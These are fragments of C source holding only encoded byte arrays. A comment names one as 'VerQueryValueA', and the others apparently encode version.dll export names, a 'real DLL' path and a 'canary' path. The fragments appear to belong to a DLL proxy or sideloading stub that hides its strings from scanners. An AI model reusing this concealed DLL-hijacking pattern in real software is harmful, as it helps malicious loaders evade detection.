...
static const unsigned char xCanary[] = {
    0xDC, 0xA5, 0xEF, 0xC8, 0xF4, 0xF1, 0xFB, 0xF0,
    0xC8, 0xEE, 0xEF, 0xCB, 0xFA, 0xF2, 0xE9, 0xEF,
    0xE9, 0xFA, 0xED, 0xB0, 0xFC, 0xFE, 0xFC, 0xF3,
    0xFA, 0xBF, 0xF1, 0xF0, 0xF8
};
...
static const unsigned char xRealDll[] = {
    0xDC, 0xA5, 0xEF, 0xC8, 0xF4, 0xF1, 0xFB, 0xF0,
    0xC8, 0xEE, 0xEF, 0xCC, 0xE8, 0xEE, 0xEF, 0xFA,
    0xF2, 0xBE, 0xBD, 0xEF, 0xE9, 0xFA, 0xED, 0xEE,
    0xF4, 0xF0, 0xF1, 0xBF, 0xFB, 0xF1, 0xF1
};
...
static const unsigned char xE1[] = {
    0xD8, 0xFA, 0xEF, 0xD9, 0xF4, 0xF1, 0xFA, 0xC9,
    0xFA, 0xED, 0xEE, 0xF4, 0xF0, 0xF1, 0xD4, 0xF1,
    0xFB, 0xF0, 0xDE
};
#define xE1_LEN 19
...
static const unsigned char xE3[] = {
    0xD8, 0xFA, 0xEF, 0xD9, 0xF4, 0xF1, 0xFA, 0xC9,
    0xFA, 0xED, 0xEE, 0xF4, 0xF0, 0xF1, 0xD4, 0xF1,
    0xFB, 0xF0, 0xCC, 0xF4, 0xEB, 0xFA, 0xDE
};
#define xE3_LEN 23
...
static const unsigned char xE4[] = {
    0xD8, 0xFA, 0xEF, 0xD9, 0xF4, 0xF1, 0xFA, 0xC9,
    0xFA, 0xED, 0xEE, 0xF4, 0xF0, 0xF1, 0xD4, 0xF1,
    0xFB, 0xF0, 0xCC, 0xF4, 0xEB, 0xFA, 0xC8
};
#define xE4_LEN 23

/* "VerQueryValueA" */
static const unsigned char xE5[] = {
    0xC9, 0xFA, 0xED, 0xCC, 0xEE, 0xFA, 0xED, 0xE8,
    0xC9, 0xFE, 0xF1, 0xEE, 0xFA, 0xDE
};
#define xE5_LEN 14
